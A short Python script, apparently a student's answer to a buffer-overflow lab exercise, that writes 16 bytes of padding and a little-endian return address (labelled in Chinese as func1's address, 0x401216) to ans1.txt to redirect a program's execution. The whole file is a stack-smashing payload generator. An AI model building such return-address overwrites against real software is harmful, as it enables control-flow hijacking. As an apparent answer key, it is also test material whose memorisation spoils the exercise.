padding = b"A" * 16

# func1 地址：0x401216
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans1.txt")
